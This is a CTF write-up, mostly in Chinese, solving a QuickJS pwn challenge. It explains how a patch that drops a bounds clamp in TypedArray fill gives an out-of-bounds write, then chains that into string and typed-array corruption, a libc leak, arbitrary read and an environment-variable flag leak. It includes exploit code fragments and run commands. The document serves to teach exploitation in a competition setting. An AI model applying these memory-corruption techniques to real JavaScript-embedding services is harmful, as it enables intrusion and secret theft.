# quickfill — QuickJS engine memory safety

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-80123B65` · 状态 solved
```

## 一句话

A TCP service evaluates JavaScript with a pinned QuickJS engine and returns a JSON result for every line you send.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `src/quickjs-base-bundle.tar.gz` | 1.5 MB | `a69e0f7f77c5…` |
| `src/patch.diff` | 380 B | `eeefd21c7da4…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 1. 题目与附件

• 服务：TCP，逐行发 JSON {"code":"<js 源码>"}，回 {"ok":true,"result":...}；每条连接一个常驻 QuickJS 运行时（同一 runtime/context，跨行保留全局状态），无 std/os/文件/网络。
• 秘密：worker 进程的 OS 环境变量 QJS_CTF_FLAG，JS 侧不可见；runner 启动时只会向 stderr 打一行 "instance flag present (OS-level only; not exposed to JavaScript)"，随后把它从 JS 能看到的任何东西里摘掉。
• 限制（adapter/server.py + runner/qjs_runner.c）：单行源 ≤ 64 KiB，默认 2 s 超时（超时 SIGKILL 整个 worker，连接状态全丢），内存 64 MiB，输出 ≤ 1 MiB。请求体只接受 code 字段，没有可调超时。
• 附件：
• quickjs-base-bundle (4).tar.gz：上游 QuickJS 2026-06-04 + runner/ + adapter/ + Dockerfile。
• patch (5).diff（sha256 eeefd21c7da493243c1d8a5e5a0a8188e65b195ce843d7bf56cdd9bf7e1132f9）。
• 远端 Dockerfile 用 Ubuntu 24.04 + libc6 2.39（build-manifest 写的是 2.39-0ubuntu8.9），但实际线上 libc 与本地 2.39-0ubuntu8.6 不是同一份（见第 5 节），所以最终 exp 不硬编码任何 libc 偏移。

### 2. 唯一的 patch 到底干了什么

patch5.diff 只删了 js_typed_array_fill 里的三行：

@@ -57746,8 +57746,6 @@

```
if (typed_array_is_oob(p))
return JS_ThrowTypeErrorArrayBufferOOB(ctx);
```

-    // RAB may have been resized by evil .valueOf method
-    final = min_int(final, p->u.array.count); shift = typed_array_size_log2(p->class_id); switch(shift) {

js_typed_array_fill（jsbox5/third_party/quickjs/src/quickjs.c:57697）的执行顺序是：

1. p = get_typed_array(ctx, this_val)；
2. len = p->u.array.count（入口快照）；
3. 先转换 argv[0]：JS_ToUint8ClampFree / JS_ToUint32 / JS_ToBigInt64 / JS_ToFloat64 —— 这里会调用用户的 valueOf；
4. 再 k = JS_ToInt32Clamp(argv[1],0,len,len)、final = JS_ToInt32Clamp(argv[2],0,len,len)；
5. typed_array_is_oob(p) 复查（RAB 长度跟踪视图此时返回 false，见下）；
6. 删掉 final = min_int(final, p->u.array.count) 后，直接用旧 len 夹出的 final 去写已经缩小的缓冲区。

上游那行 clamp 的语义正是".valueOf 里可能把 RAB resize 小，写之前再按当前 count 夹一次"。删掉它 => 越界常量写。

typed_array_is_oob（quickjs.c:57149）对 track_rab 视图：offset > abuf->byte_length 才算 OOB，否则直接 return FALSE。所以 ab.resize(小) 之后"长度跟踪视图"的 OOB 检查会放行，而写入用的是缩小后的 ptr 和缩小前的 final。

### 3. 三个原语

P1：一次越界常量写（4/8 字节）

```js
var ab  = new ArrayBuffer(0x4000, {maxByteLength:0x4000});
var u32 = new Uint32Array(ab);            // 长度跟踪视图，entry 时 count=0x1000
var evil = { valueOf(){ ab.resize(0x1000); /* ...堆操作... */ return 0x40000000; } };
```

u32.fill(evil, start, end);               // 值先转换 -> 缩小 -> 仍写到旧 len

• 缩小后 u.array.count 变成新长度（0x400），但 len（局部）还是 0x1000；final 由 len 夹到 0x1000。
• 写入起点是缩小后没变的 abuf->data（glibc 对 brk 上的 chunk 缩小是原地 split），所以能一路写到老分配区间末尾。
• 每次 resize 只能放一次越界 fill；但运行时在一条连接内常驻，可以开多个 RAB 做多轮。

P2：篡改 JSString 长度 => 1 GiB 前向读窗口

JSString 布局（quickjs.c:583）：len:31 | is_wide_char:1 | hash:30 | atom_type:2 | hash_next | u.str8[]，sizeof=12，字符数据在 +0xC。

关键点："A".repeat(0x2000) 走 StringBuffer，js_alloc_string 会一次性按最终长度分配 JSString（js_malloc_large(sizeof(JSString)+len+1)）。所以：

• ab 的 chunk 是 [U-0x18, U+0x4000)（U = abuf->data，QJS large block 头 0x10 + malloc 头 0x8）；
• ab.resize(0x1000) 把后半段 0x3000 释放成一个 unsorted chunk，起始 H = U+0x1000-0x8；
• 紧接着 "A".repeat(0x2000) 从这个 free chunk 的低端切走：QJS large header 在 H+0x10，JSString 在 H+0x18 = U+0x1010，数据在 U+0x101C；
• 于是 u32.fill(evil, (0x1000+0x10)/4, +1) 这一发 4 字节写，正好落在 JSString 的 len 字上，写入 0x40000000。

得到 s.length == 0x40000000、ab.byteLength == 0x1000，s.charCodeAt(i) 变成从字符串数据起 1 GiB 的前向读。

还必须先放一个 guard = new ArrayBuffer(0x800)（紧跟在 ab 之后）：否则被释放的尾巴会和 top chunk 合并，fd/bk 不会写，读出来全是 0。

字符串数据之后 0x2020 处是下一个 chunk 的头，字符串数据索引 0x200C = fd、0x2014 = bk（8 字节小端），即 main_arena 的 unsorted bin 链表头（本地 2.39 实测 fd == bk == main_arena+0x60）。

P3：把某个 Uint8Array 的 count 改成 1 GiB => 任意读写

第二轮（同一连接、同一 runtime）：

```js
var ab2  = new ArrayBuffer(0x10000, {maxByteLength:0x10000});  // 必须 < mmap 阈值 0x20000
var u32b = new Uint32Array(ab2);  // 全填 0x13572468 作 magic
var guard2 = new ArrayBuffer(0x800);                            // 同样防合并
var evil2 = { valueOf(){
```

ab2.resize(0x2000);                       // 释放 0xe000 尾巴

```
for (i<120) junk[i] = {};                 // 耗尽已有 0x48 类 QJS arena
v0 = new Uint8Array(0x1801); v0[0..7] = 91 82 73 64 55 46 37 28;
for (i<120) junk2[i] = {};                // 在 v0 缓冲之上开出新 arena
v1 = new Uint8Array(0x1842);
// 在 s 的 1 GiB 窗口里找 ab2 的 magic -> U2
// 找 v0 的 JSObject: class_id==23 @+0x12 且 count==0x1801 @+0x38
IDX = (V0OFF + 0x38 - U2) / 4;
return 0x40000000;
}};
u32b.fill(evil2, {valueOf:()=>IDX}, {valueOf:()=>IDX+1});
```

要点：

• 缓冲要大于所有旧洞：glibc 的 unsorted bin 是"最老的先被取"，第一轮剩下的 ~0xfe0 小块比 0x311 的旧版 victim 大，会先被用掉（这正是 t5 第一次失败的原因）。把 victim 长度提到 0x1801/0x1842 后，它们只能来自 ab2 刚释放的 0xe000 尾巴。
• {} 是 0x40 字节 JSObject（+8 block 头 = 0x48 类），用来把 v0 的 JSObject 挤进尾巴里新开的 4 KiB arena，并让 v1 的 arena 落在 v0 缓冲之上（这样 v0 的 1 GiB 窗口能覆盖到 v1 的对象）。
• fill(value, start, end) 的 value 先求值、start/end 后求值，所以 IDX 可以在这个 evil valueOf 里算完，再通过两个 valueOf 返回，让唯一那发越界写正好落在 v0 的 count 字段（v0 的 u.ptr 不动）。写完 v0.length == 0x40000000。
• 然后在 v0 的窗口里按 class_id==23 && count==0x1842 找到 v1 的 JSObject，用 v0 的字节写覆盖 v1.u.ptr（+0x30）即可让 v1[0..8) 从任意地址读 8 字节（v1 的 count 保持 0x1842，足够取字符串）。

### 4. libc base：不硬编码 unsorted 偏移

fd 低 12 位就是"真实 unsorted 偏移 mod 0x1000"。从 fd - (0x100000+low) 开始，每 0x1000 向上探一次（探针地址始终 ≥ libc base，不会踩空）：

```js
var low = Number(fd & 0xfffn), hit = -1;
for (var k = 0x100000 + low; k <= 0x240000; k += 0x1000) {
setptr(fd - BigInt(k));
if (v1[0]==0x7f && v1[1]==0x45 && v1[2]==0x4c && v1[3]==0x46) { hit = k; break; }  // \x7fELF
}
var libc = fd - BigInt(hit);
```

实测：

| 目标 | libc | unsorted fd 偏移（= hit） |
| --- | --- | --- |
| 本地 WSL | glibc 2.35 | 0x21ace0 |
| 本地 /opt/lc23986 | 2.39-0ubuntu8.6 | 0x203b20 |
| 远端 | 另一份 2.39 构建 | 0x1d3cc0 |

远端第一次直接用 0x203b20 当偏移去读 libc+0x20ad58，worker 立刻 WorkerClosedError —— 这就是"线上 libc 与附件镜像不同"的信号；改成运行时 ELF 扫描后解决。

### 5. 找 __environ：用 program headers 限界，再按栈指针特征筛

__environ 是 libc 数据段里一个指向栈上 envp[] 的指针。为了不越界读（越界读 = worker 段错误 = 连接废掉）：

1. 用 v1 的任意读解析 ELF program headers：e_phoff@0x20、e_phentsize@0x36、e_phnum@0x38；对所有 PT_LOAD（p_type==1）取 max(p_vaddr + p_memsz) 得到数据段末尾 dend。
2. 扫描窗口 [hit-0x8000, min(hit+0x12000, dend-8))，步长 8。
3. 对每个 qword q：
• q 必须是栈指针（0x7ff000000000 < q < 0x800000000000）；
• read(q) 必须是栈指针 a0，且 read(a0) 是可打印 ASCII 字符串并含 =（env 的 KEY=VALUE）；
• 顺着 q 读最多 48 个 qword，每个都是栈指针、与 a0 距离 < 0x40000，逐个读 ≤160 字节字符串，匹配 "QJS_CTF_FLAG="。
4. 命中即 flag。

实测 __environ 相对 hit 的偏移：本地 2.39 = 0x7238（绝对 0x20ad58，与 readelf -sW 一致），远端 = 0x7660（绝对 0x1db320）。最终 exp 完全不依赖这两个数。

### 6. 复现步骤

**6.1 构建（WSL Ubuntu-22.04）**

```
cd /mnt/d/.../TPCTF决赛/jsbox5
```

tar xzf "../quickjs-base-bundle (4).tar.gz" -C . --strip-components=1   # 或在 jsbox5/ 内直接解包

patch -p1 < patch5.diff

make -j8 runner          # -> build/qjs_runner

（调试版：make BUILD_DIR=build_dbg OPT="-O0" -j8 runner；带分配器地址打印：make BUILD_DIR=build_addr OPT="-O0" -j8 runner，运行时 QJS_ADDR_DEBUG=1。）

**6.2 本地验证（用题目镜像同版本 libc 2.39）**

```bash
cd /mnt/d/.../TPCTF决赛/jsbox5
LOADER=/opt/lc23986/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 \
LIBPATH=/opt/lc23986/usr/lib/x86_64-linux-gnu \
FLAG='«FLAG»' \
python3 tools/qclient.py tools/exploit_final.js
```

# STATUS O TIME 0.02

# {"libc":"7cc460600000","envoff":29240,"flag":"QJS_CTF_FLAG=«FLAG»"}

envoff: 29240 = 0x7238 与 __environ(0x20ad58) - unsorted(0x203b20) 完全一致，说明整条链在本地是正确的。

**6.3 打远端**

```
cd /mnt/d/.../TPCTF决赛/jsbox5
PAYLOAD=tools/exploit_final.js python3 tools/solve5.py
```

# {"ok":true,"result":{"libc":"7c60c0826000","envoff":30304,

#   "flag":"QJS_CTF_FLAG=«FLAG»"}}

# FLAG: QJS_CTF_FLAG=«FLAG»

（solve5.py 默认 HOST=172.16.209.2 PORT=8000，发一行 {"code": ...}；envoff: 30304 = 0x7660。）

连跑 2 次结果一致，整条 exp 执行约 0.02 s，远低于 2 s 超时。

### 7. 关键文件

| 文件 | 作用 |
| --- | --- |
| jsbox5/patch5.diff | 题目给的补丁（唯一改动） |
| jsbox5/tools/qclient.py | 本地 runner 客户端：uint32_be 长度 + 源码，可选 LOADER/LIBPATH/FLAG |
| jsbox5/tools/solve5.py | 远端 JSON 行客户端（HOST/PORT/PAYLOAD/TIMEOUT 环境变量） |
| jsbox5/tools/leak1.js | 只用 P2 的 libc 泄漏（fd/bk/sz） |
| jsbox5/tools/t18.js | 带诊断字段的完整链（fd/dend/win/nst/envoff/flag） |
| jsbox5/tools/exploit_final.js | 最终 exp（自校准，无硬编码偏移） |

### 8. 走过的弯路（结论）

1. BIG=0x20000 直接 mmap：超过 glibc mmap 阈值（0x20000）后，ab.resize(小) 用 mremap 保留了原映射，fill 末尾写到 base+0x20000 的未映射页 -> SIGSEGV。所有 RAB 必须 < 0x20000，最终用 0x4000 / 0x10000。
2. 想靠"缩回再放大"读被释放的尾巴：js_array_buffer_resize 增长时会 memset [old, new)，读回来全是 0，此路不通，必须用 P2/P3 这种"另开窗口"的读法。
3. copyWithin 不受影响：它自己还有 space = p->u.array.count - max_int(to,from) 的夹取，patch 只删了 fill 的 clamp。
4. 固定长度视图没用：resize 后 js_array_buffer_update_typed_arrays 会把非 track_rab 视图的 count=0, ptr=NULL，没有"陈旧视图"可用（与 jsbox4 的 patch4 不同）。
5. 从 charCodeAt 拼 qword 要注意小端：v |= BigInt(c) << (8*j)；写成大端会得到字节反转的假地址。
6. 不要盲目扫 libc 数据段：窗口必须用 program headers 的 PT_LOAD 末尾限界，并且解引用栈指针前要先验证"指向可打印 KEY=VALUE 字符串"，否则一次访存错误就是 worker 崩溃、连接报废。
7. 调试时多次遇到 JS_GetPropertyValue 在 quickjs.c:9056 崩：都是指针被写坏后继续用（v1.u.ptr 被写成负 BigInt 的补码 0xfffffffffff00000，或忘了 setptr(envp) 就顺着 env 数组读）。

## 结果

- flag sha256：`90cd8948a99c8fa1ce854d08dbe66799ba2c6e7f8196636fbe5d1c5bf6447dcb`, `ebe6d4b9e089529598cffe8e72d84a32084568cdfd1c46b9afefa163b8e7c9e2`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/writeup.md`

## 待核实

- 本条目由 WP 第 33 节《quickfill — QuickJS engine memory safety》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
